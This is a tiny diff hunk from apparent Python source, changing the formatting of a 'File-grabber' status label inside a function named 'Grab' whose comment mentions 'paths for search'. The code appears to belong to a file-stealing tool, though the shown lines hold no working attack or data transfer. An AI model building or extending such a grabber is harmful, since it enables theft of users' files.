@@ -72,7 +72,7 @@ def Grab(data):
         except:
             pass
         try:
-            data.append("\n\n📁File-grabber📁")
+            data.append("\n\n📁<b>File-grabber</b>📁")
             """
             paths for search
             """
